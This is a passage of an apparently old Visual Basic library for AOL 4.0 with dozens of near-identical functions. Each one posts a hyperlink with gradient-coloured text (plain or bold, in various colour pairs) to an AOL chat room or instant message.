     AoL4_ChatSend ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_LinkBlueGreenBlue(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ChatSend ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_LinkBluePurple(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_ChatSend ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_LinkBluePurpleBlue(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_ChatSend ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_LinkBlueRed(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_LinkBlueRedBlue(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_ChatSend ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_LinkBlueYellow(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ChatSend ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_LinkBlueYellowBlue(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_LinkBoldBlackBlueBlack(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_ChatSend ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function
Function AoL4_LinkBoldBlackGreen(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_ChatSend ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function
Function AoL4_LinkBoldBlackGreenBlack(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ChatSend ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function
Function AoL4_LinkBoldBlackGrey(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 220 / a
        f = e * b
        G = RGB(f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function
Function AoL4_LinkBoldBlackGreyBlack(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ChatSend ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function
Function AoL4_LinkBoldBlackPurple(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ChatSend ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function
Function AoL4_LinkBoldBlackPurpleBlack(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function
Function AoL4_LinkBoldBlackRed(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_ChatSend ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function
Function AoL4_LinkBoldBlackedRedBlack(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ChatSend ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function
Function AoL4_LinkBoldBlackRedBlack(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function
Function AoL4_LinkBoldBlackYellow(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_ChatSend ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function
Function AoL4_LinkBoldBlackYellowBlack(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function

Function AoL4_LinkBoldBlueBlack(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_ChatSend ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function

Function AoL4_LinkBoldBlueBlackBlue(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function

Function AoL4_LinkBoldBlueGreen(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_ChatSend ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function

Function AoL4_LinkBoldBlueGreenBlue(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ChatSend ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function

Function AoL4_LinkBoldBluePurple(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_ChatSend ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function

Function AoL4_LinkBoldBluePurpleBlue(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_ChatSend ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function

Function AoL4_LinkBoldBlueRed(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function

Function AoL4_LinkBoldBlueRedBlue(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_ChatSend ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function

Function AoL4_LinkBoldBlueYellow(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ChatSend ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function

Function AoL4_LinkBoldBlueYellowBlue(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function
Function AoL4_LinkGreenBlack(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_LinkGreenBlackGreen(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_LinkGreenBlue(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_LinkGreenBlueGreen(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_LinkGreenPurple(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL4_ImSend (wh0), ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_LinkGreenPurpleGreen(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_LinkGreenRed(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_LinkGreenRedGreen(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_LinkGreenYellow(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_LinkGreenYellowGreen(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & "></b>" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_LinkGreyBlack(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 220 / a
        f = e * b
        G = RGB(255 - f, 255 - f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL4_ChatSend ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_LinkGreyBlackGrey(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_LinkGreyBlue(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_LinkGreyBlueGrey(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL4_ChatSend ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_LinkGreyGreen(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_LinkGreyGreenGrey(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_LinkGreyPurple(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_LinkGreyPurpleGrey(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_LinkGreyRed(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_LinkGreyRedGrey(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_LinkGreyYellow(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_LinkGreyYellowGrey(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_LinkBoldGreenBlack(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function
Function AoL4_LinkBoldGreenBlackGreen(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function

Function AoL4_LinkBoldGreenBlue(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   AoL4_ChatSend ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function

Function AoL4_LinkBoldGreenBlueGreen(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function

Function AoL4_LinkBoldGreenPurple(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function

Function AoL4_LinkBoldGreenPurpleGreen(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function

Function AoL4_LinkBoldGreenRed(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function

Function AoL4_LinkBoldGreenRedGreen(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
 AoL4_ChatSend ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function

Function AoL4_LinkBoldGreenYellow(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function

Function AoL4_LinkBoldGreenYellowGreen(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<b><Font Color=#" & h & "></b>" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function

Function AoL4_LinkBoldGreyBlack(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 220 / a
        f = e * b
        G = RGB(255 - f, 255 - f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL4_ChatSend ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function

Function AoL4_LinkBoldGreyBlackGrey(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
 AoL4_ChatSend ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function

Function AoL4_LinkBoldGreyBlue(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function

Function AoL4_LinkBoldGreyBlueGrey(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function

Function AoL4_LinkBoldGreyGreen(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function

Function AoL4_LinkBoldGreyGreenGrey(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL4_ChatSend ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function

Function AoL4_LinkBoldGreyPurple(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function

Function AoL4_LinkBoldGreyPurpleGrey(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function

Function AoL4_LinkBoldGreyRed(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function

Function AoL4_LinkBoldGreyRedGrey(URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255)
